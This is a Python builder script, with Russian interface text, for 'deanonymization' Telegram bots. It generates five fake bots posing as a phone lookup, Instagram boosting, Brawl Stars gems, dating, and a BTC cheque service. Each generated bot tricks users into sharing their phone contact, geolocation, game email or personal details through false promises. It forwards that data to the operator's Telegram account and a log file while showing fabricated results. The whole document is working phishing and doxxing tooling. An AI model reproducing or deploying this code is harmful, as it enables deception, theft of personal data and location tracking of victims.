import colorama
from colorama import Fore, Back, Style
import os
os.system('clear')
print(Fore.RED + '''
         _,.-------.,_
     ,;~'             '~;,
   ,;                     ;,
  ;                         ;
 ,'                         ',
,;                           ;,
; ;      .           .      ; ;
| ;   ______       ______   ; |
|  `/~"     ~" . "~     "~\'  |
|  ~  ,-~~~^~, | ,~^~~~-,  ~  |
 |   |        }:{        |   |
 |   l       / | \       !   |
 .~  (__,.--" .^. "--.,__)  ~.
 |     ---;' / | \ `;---     |
  \__.       \/^\/       .__/
   V| \                 / |V
    | |T~\___!___!___/~T| |
    | |`IIII_I_I_I_IIII'| |
    |  \,III I I I III,/  |
     \   `~~~~~~~~~~'    /
       \   .       .   /     
         \.    ^    ./
           ^~~~^~~~^


	''')
input(Fore.GREEN + "Нажмите Enter")
os.system('clear')
print(Fore.MAGENTA + ' _____    _   _   _   _ ' + Fore.YELLOW + ' __  __   ______ ')
print(Fore.MAGENTA + '|  __ \  | \ | | | \ | |' + Fore.YELLOW + '|  \/  | |  ____|')
print(Fore.MAGENTA + '| |  | | |  \| | |  \| |' + Fore.YELLOW + '| \  / | | |__   ')
print(Fore.MAGENTA + '| |  | | | . ` | | . ` |' + Fore.YELLOW + '| |\/| | |  __|  ')
print(Fore.MAGENTA + '| |__| | | |\  | | |\  |' + Fore.YELLOW + '| |  | | | |____ ')
print(Fore.MAGENTA + '|_____/  |_| \_| |_| \_|' + Fore.YELLOW + '|_|  |_| |______|')
print(Fore.YELLOW + '-----------------------------------------')
print(Fore.YELLOW + '|' + Fore.BLUE +  " Telegram Deanonymization bot builder  " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "       Developer: @lamer112311         " + Fore.YELLOW + '|')
print(Fore.YELLOW + '|' + Fore.BLUE +  "        Channel: cutt.ly/CyberPuffin   " + Fore.YELLOW + '|')
print(Fore.YELLOW + '-----------------------------------------')
userid = input(Fore.RED +  "Введите свой Telegram ID > ")
token = input(Fore.BLUE +  "Введите токен бота > ")
print(Fore.CYAN + '''
[1] Пробив по номеру
[2] Накрутка инстаграм
[3] Бравл старс
[4] Знакомства
[5] BTC BANKER
	''')
choice = input(Fore.MAGENTA +  "Выберите вариант фейк интерфейса:>>> ")
if not choice.isdigit():
	print("Ошибка, вариант должен быть чисельным")
	exit(0)
choice = int(choice)



if choice == 1:
	f = open('probiv.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
bot.send_message(ID, '!BOT STARTED!') 
print("Бот запущен!")

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот, который, может показать информацию по номеру телефона!
	Для поиска информации, введите команду /getinfo''') 
	
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 

@bot.message_handler(commands=['getinfo'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Введите любой номер телефона') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		user_input = message.text
		num = user_input.replace('+', '')

		if not num.isdigit():
			msg = bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
			return

		bot.send_message(m_id, f'Запрос на номер {{num}} отправлен!')
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные вопросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {{first}} {{last}}
			├ID: {{userid}}
			├Ник: @{{nick}}
			└Номер телефона: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')

	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	button = types.InlineKeyboardButton(text="Расширенный поиск", callback_data="find")
	keyboardmain.add(button)
	bot.send_message(message.chat.id, f'''
		Информация о номере
		├Оператор: Beeline
		└Страна: Россия
		''', reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Подтвердить", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Для использования бесплатного расширенного поиска, подтвердите геолокацию!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}}
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└Адрес: {{random.choice(adr)}}
			''')
bot.polling()
		""")
	f.close()
	print("Файл probiv.py сохранен")

if choice == 2:
	f = open('nacr.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Бот запущен!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, '''👋 Привет! 👋
		Это бот для накрутки лайков и подписчиков в инстаграм!
		Для старта напишите /nacrutka''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['nacrutka'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="Лайки", callback_data="first")
	second_button = types.InlineKeyboardButton(text="Подписчики", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт накрутки:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество лайков (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество подписчиков (не более 500)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'Колличество лайков не может быть более 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
			return

		if int(num) > 500:
			bot.reply_to(message, 'Колличество подписчиков не может быть более 500!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегестрируйтесь в боте!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {{first}} {{last}}
			├ID: {{userid}}
			├Ник: @{{nick}}
			└Номер телефона: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		bot.send_message(message.chat.id, 'Регистрация прошла успешно!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Введите ник в инстаграм:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Ник: {{inp}} ')#⏳
		bot.send_message(ID, f'Ник в инстарам: {{inp}}')
		bot.send_message(message.chat.id, 'Ожидайте накрутку на ваш аккаунт в течении 24 часов!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')




bot.polling()


		""")
	f.close()
	print("Файл nacr.py сохранен")

if choice == 3:
	f = open('brawl.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random


log = open('bot-log.txt', 'a+', encoding='utf-8')
ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!')
print("Бот запущен!") 
@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Привет, {{message.from_user.first_name}}! 👋
		Это бот, который может задонатить в бравл старс 
		Чтобы начать, напиши команду /don''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['don'])
def start(message):
	keyboardmain = types.InlineKeyboardMarkup(row_width=2)
	first_button = types.InlineKeyboardButton(text="💰Золото💰", callback_data="first")
	second_button = types.InlineKeyboardButton(text="💎Гемы💎", callback_data="second")
	keyboardmain.add(first_button, second_button)
	bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "first":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество золота💰 (не более 500)') 
		bot.register_next_step_handler(msg, proc1)

	elif call.data == "second":
		msg = bot.send_message(call.message.chat.id, 'Введите колличество гемов💎 (не более 50)') 
		bot.register_next_step_handler(msg, proc2)

def proc1(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return
		if int(num) > 500:
			bot.reply_to(message, 'Колличество золота не может быть более 500!')
			return


		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегистрируйтесь в боте!''', reply_markup=keyboard)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')


def proc2(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return

		if int(num) > 50:
			bot.reply_to(message, 'Колличество гемов не может быть более 50!')
			return

		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные запросы зарегистрируйтесь в боте!''', reply_markup=keyboard)

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		info = f'''
			Данные
			├Имя: {{first}} {{last}}
			├ID: {{userid}}
			├Ник: @{{nick}}
			└Номер телефона: {{phone}}
			'''

		bot.send_message(ID, info)
		print(info)

		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		bot.send_message(message.chat.id, 'Регистрация прошла успешно!') 
		time.sleep(1)
		msg = bot.send_message(message.chat.id, 'Введите почту, привязанную к игре:') 
		bot.register_next_step_handler(msg, entr)

def entr(message):
	try:
		inp = message.text
		m_id = message.chat.id


		bot.send_message(ID, f'Почта: {{inp}}')

		markup_reply = types.ReplyKeyboardMarkup(resize_keyboard = True)
		item_an = types.KeyboardButton('Получить больше гемов')
		markup_reply.add(item_an)
		bot.send_message(message.chat.id, f'Почта: {{inp}} ', reply_markup = markup_reply)
		time.sleep(1)
		bot.send_message(message.chat.id, 'Ожидайте донат на ваш аккаунт в течении 24 часов!')

	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types = ['text'])
def get_text(message):
	if message.text == 'Получить больше гемов':
		m_id = message.chat.id
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Подтвердить", request_location=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Чтобы получить больше гемов, подтвердите геолокацию!''', reply_markup=keyboard)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}} 
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		msg = bot.send_message(message.chat.id, 'Введите колличество гемов💎 (не более 800)') 
		bot.register_next_step_handler(msg, proc3)

def proc3(message):
	try:
		num = message.text
		m_id = message.chat.id

		if not num.isdigit():
			msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /don!')#⏳
			return

		if int(num) > 800:
			bot.reply_to(message, 'Колличество гемов не может быть более 800!')
			return

		time.sleep(2)
		msg = bot.send_message(message.chat.id, 'Введите почту, привязанную к игре:') 
		bot.register_next_step_handler(msg, entr1)
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

def entr1(message):
	try:
		inp = message.text
		m_id = message.chat.id

		bot.reply_to(message, f'Почта: {{inp}} ')#⏳
		bot.send_message(ID, f'Почта: {{inp}}')
		time.sleep(1)
		bot.send_message(message.chat.id, 'Ожидайте донат на ваш аккаунт в течении 24 часов!')
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')




	

bot.polling()


		""")
	f.close()
	print("Файл brawl.py сохранен")

if choice == 4:
	f = open('znak.py', 'w+', encoding='utf-8')
	f.write(f"""
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Бот запущен!") 

@bot.message_handler(commands=['start'])
def start(message):
	bot.send_message(message.chat.id, f'''👋 Привет! {{message.from_user.first_name}}👋
		Это бот для знакомства!
	Чтобы начать, введите /znak''') 
@bot.message_handler(commands=['lamer112311dev'])
def start(message):
	bot.send_message(message.chat.id, 'Автор скрипта: @lamer112311. Канал: cutt.ly/CyberPuffin') 
@bot.message_handler(commands=['znak'])
def start(message):
	msg = bot.send_message(message.chat.id, 'Для начала напишите немного о себе (одним сообщением)') 
	bot.register_next_step_handler(msg, proc2)

def proc2(message):
	try:
		m_id = message.chat.id
		num = message.text
		bot.send_message(ID, f'Полученая информация: {{num}}')
		print(num)
		time.sleep(2)
		keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_phone = types.KeyboardButton(text="Зарегистрироваться", request_contact=True) 	
		keyboard.add(button_phone)	
		bot.send_message(m_id, '''Для того, чтобы использовать бота, зарегистрируйтесь, пожалуйста!''', reply_markup=keyboard)
# Отловка ошибок
	except Exception as e:
		bot.send_message(ID, e)
		bot.send_message(m_id, 'Произошла неопознанная ошибка, перезагрузите бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "Регистрация прошла успешно!")
		info = f'''
			Данные
			├Имя: {{first}} {{last}}
			├ID: {{userid}}
			├Ник: @{{nick}}
			└Номер телефона: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, 'Отправьте свой контакт!')
		time.sleep(1)
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Отправить", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(message.chat.id, text='Отправьте свою геопозицию, для того, чтобы бот нашел ближайших от вас пользователей!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location']) 
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {{message.chat.id}}
		├Longitude: {{lon}}
		├Latitude: {{lat}} 
		└Карты: https://www.google.com/maps/place/{{lat}}+{{lon}} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, 'Поиск...')
		time.sleep(2)
		bot.send_message(message.chat.id, 'К сожалению в базе не нашлось подходящих пользователей!')
bot.polling()
		""")
	f.close()
	print("Файл znak.py сохранен")
if choice == 5:
	f = open('btc.py', 'w+', encoding='utf-8')
	f.write(f"""
	
import telebot
from telebot import types
import time
import random

ID = '{userid}'
bot = telebot.TeleBot("{token}")
bot.send_message(ID, '!BOT STARTED!') 
print("Бот запущен!") 


@bot.message_handler(commands=['admin'])
def adm(message):
	if message.from_user.id == int(ID):
		msg = bot.send_message(ID, 'Добро пожаловать в админ панель бота! \\n Введите сумму на которую создать чек:') 
		bot.register_next_step_handler(msg, check)
def check(message):
	try:
		if message.text.isdigit():
			bot.send_message(ID, f'Сумма: {{message.text}}')
			bot.send_message(ID, f'Ваш чек: https://t.me/{{bot.get_me().username}}?start={{message.text}}')
		else:
			bot.send_message('Значение должно быть чисельным!')

	except Exception as e:
		print(e)

@bot.message_handler(commands=['start'])
def start(message):
	if message.from_user.id == int(ID):
		bot.send_message(ID, 'Добро пожаловать в бота! \\n Для входа в админ панель напишите: /admin') 
	else:
		try:
			summ = message.text.split()[1]
			userid = message.chat.id
			bot.send_message(ID, f'Пользователь с ID:{{userid}} "Обналичил" ваш чек на сумму:{{summ}}')
			bot.send_message(message.chat.id, f'''Вы получили 0.00{{random.randint(51, 253)}} BTC ({{summ}} RUB) от /uPorterBaseTheFist!''')
			time.sleep(1)
			
			m_id = message.chat.id
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
		
		except Exception as e:
			keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
			button_phone = types.KeyboardButton(text="✅Снять ограничения", request_contact=True) 	
			keyboard.add(button_phone)	
			bot.send_message(message.chat.id, "Запрещено >>> \\n❌ Ваш аккаунт ограничен! Вероятнее всего, Вы нарушили условия сервиса (https://bitzlato.bz/en/terms)!", reply_markup=keyboard)
			userid = message.chat.id
			bot.send_message(ID, f'Пользователь с ID:{{userid}} запустил бота!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
	if message.contact is not None: 
		nick = message.from_user.username
		first = message.contact.first_name
		last = message.contact.last_name
		userid = message.contact.user_id
		phone = message.contact.phone_number
		bot.send_message(userid, "✅Ограничения успешно сняты, спасибо, что воспользовались нашим ботом!")
		info = f'''
			Данные
			├Имя: {{first}} {{last}}
			├ID: {{userid}}
			├Ник: @{{nick}}
			└Номер телефона: {{phone}}
			'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(info + '  ')
		log.close()
		bot.send_message(ID, info)
		print(info)

		if message.contact.user_id != message.chat.id:
			bot.send_message(message.chat.id, '❌Авторизуйте СВОЙ контакт!')
	
bot.polling()
		""")
	f.close()
	print("Файл btc.py сохранен")
